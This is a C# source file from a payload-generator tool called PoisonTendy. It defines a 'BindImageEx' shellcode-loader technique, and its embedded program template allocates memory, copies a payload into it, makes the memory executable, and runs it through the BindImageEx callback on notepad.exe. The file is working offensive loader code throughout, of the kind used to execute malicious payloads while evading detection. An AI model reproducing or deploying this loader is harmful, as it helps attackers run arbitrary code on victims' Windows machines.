using SingleDose.Techniques;
using System.Collections.Generic;

namespace PoisonTendy.Techniques.Loaders
{
    internal class BindImageEx : ITechnique
    {
        bool ITechnique.IsLoader => true;

        bool ITechnique.IsUnsafe => false;

        string ITechnique.TechniqueName => "BindImageEx";

        string ITechnique.TechniqueDescription => null;

        List<string> ITechnique.Invokes => new List<string>() { "VirtualAlloc", "BindImageEx" };

        List<string> ITechnique.Prerequisites => null;
        string ITechnique.VProtect => @"uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle, hAlloc, payload.Length, 0x20, out oldProtect);";

        List<string> ITechnique.TechniqueReferences => new List<string>() {
            @"https://github.com/Wra7h/FlavorTown"
        };

        string ITechnique.Base => @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Linq;

namespace {{NAMESPACE}}
{
    class Program
    {
        public static void Main(string[] args)
        {
            {{MODE}}
            {{TRIGGER}}
            IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x1000 | 0x2000, {{flProtect}});
            Marshal.Copy(payload, 0, hAlloc, payload.Length);
            {{PROTECT}}
            IntPtr pFileName = Marshal.StringToHGlobalAnsi(@""C:\Windows\notepad.exe"");
            BindImageEx(0x2, pFileName, IntPtr.Zero, IntPtr.Zero, hAlloc);
            Marshal.FreeHGlobal(pFileName);
        }
        {{ARGS}}
        {{INVOKE}}
    }
}";
    }
}
